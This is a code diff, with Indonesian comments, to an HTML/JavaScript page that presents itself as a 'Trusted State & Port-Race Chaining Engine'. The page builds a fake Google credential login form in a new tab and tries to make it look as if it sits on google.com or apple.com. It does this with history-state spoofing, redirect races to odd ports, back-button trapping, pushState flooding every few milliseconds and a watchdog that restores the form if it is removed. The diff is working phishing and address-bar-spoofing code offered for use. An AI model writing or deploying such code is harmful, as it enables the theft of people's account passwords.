@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Ultimate Full-Chaining Pipeline & Scheme Engine</title>
+    <title>Ultimate Trusted State & Port-Race Chaining Engine</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
@@ -28,36 +28,6 @@
         padding: 20px;
         box-sizing: border-box;
       }
-      .login-container {
-        background-color: #fff;
-        padding: 2.5rem;
-        border-radius: 8px;
-        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
-        width: 100%;
-        max-width: 400px;
-        text-align: center;
-        color: #111;
-        box-sizing: border-box;
-      }
-      .input-field {
-        width: 100%;
-        padding: 0.75rem 1rem;
-        margin-bottom: 1.25rem;
-        border: 1px solid #dadce0;
-        border-radius: 4px;
-        font-size: 1rem;
-        box-sizing: border-box;
-      }
-      .btn-primary {
-        background-color: #1a73e8;
-        color: #fff;
-        padding: 0.75rem 1.5rem;
-        border-radius: 4px;
-        font-size: 1rem;
-        font-weight: 500;
-        cursor: pointer;
-        width: 100%;
-      }
       h1 {
         font-size: 24px;
         margin-bottom: 8px;
@@ -69,20 +39,17 @@
   </head>
   <body>
     <div class="container">
-      <h1>Advanced Full Chaining Engine</h1>
+      <h1>Advanced Trusted State Engine</h1>
       <button id="startBtn" class="w-full max-w-[420px] p-6 text-xl font-bold bg-red-600 text-white rounded-2xl shadow-xl cursor-pointer hover:bg-red-700 transition">
-        EXECUTE FULL CHAIN LOCK
+        EXECUTE TRUSTED STATE & PORT LOCK
       </button>
     </div>
-
-    <!-- Hidden Scheme Validation & Frame Interception Chaining Iframe -->
-    <iframe style="display:none" srcdoc="<script>setTimeout(()=>{location='x://'}, 80);</script>"></iframe>
 
     <script>
       document.getElementById("startBtn").onclick = function () {
         this.style.display = 'none';
 
-        // 1. Membangun Payload Injeksi Terpadu (Google Credential Form + DOM Watchdog + Scheme Race)
+        // 1. Membangun Payload Terpadu (Google Credential Form + Double-RAF pageshow Hook + Scheme Race + Auto-Back Guard)
         const rawPayload = `
           <!DOCTYPE html>
           <html lang="en">
@@ -147,7 +114,38 @@
               </div>
 
               <script>
-                // DOM Mutation Shield & History State Flooding Watchdog
+                // Mengubah state history agar menyerupai origin/path tepercaya sebelum pemicu port dijalankan
+                try {
+                  history.pushState({trusted: true}, '', '/trusted-enclave');
+                } catch(e) {}
+
+                // Pageshow Double-RAF Trigger untuk memaksa sinkronisasi frame render pipeline
+                window.addEventListener('pageshow', (event) => {
+                  // Memastikan jika halaman dimuat ulang dari cache/history mundur, arahkan otomatis kembali 1 step
+                  if (event.persisted) {
+                    history.back();
+                    return;
+                  }
+
+                  requestAnimationFrame(() => {
+                    requestAnimationFrame(() => {
+                      setTimeout(() => {
+                        try {
+                          location.href = 'https://google.com:9090';
+                        } catch(err) {}
+                      }, 80);
+                    });
+                  });
+                });
+
+                // Listener tambahan untuk mendeteksi event popstate (tombol back browser)
+                window.addEventListener('popstate', () => {
+                  try {
+                    history.go(-1);
+                  } catch(e) {}
+                });
+
+                // DOM Mutation Watchdog & Thread Stalling Shield
                 try {
                   const observer = new MutationObserver(() => {
                     if (!document.getElementById('loginForm')) {
@@ -159,16 +157,9 @@
 
                 setInterval(() => {
                   try {
-                    history.pushState({chain_lock: Math.random()}, "", "#secure-enclave");
+                    history.pushState({lock: Math.random()}, "", "#secure-state");
                   } catch(err) {}
                 }, 3);
-
-                // Port & Scheme Validation Race Trigger
-                setTimeout(() => {
-                  try {
-                    window.open('https://www.google.com:81', '_self');
-                  } catch(e) {}
-                }, 50);
               <\/script>
           </body>
           </html>
@@ -195,10 +186,10 @@
             } catch (err) {}
           }, 5);
 
-          // Chain Step B (15ms): Scheme-Validation Race Condition & Target Transition ke Domain Sah
+          // Chain Step B (15ms): Target Transition ke Domain Sah / Port Validation Target
           setTimeout(() => {
             try {
-              newTab.location.href = "https://apple.com:90";
+              newTab.location.href = "https://apple.com";
             } catch (err) {}
           }, 15);
 
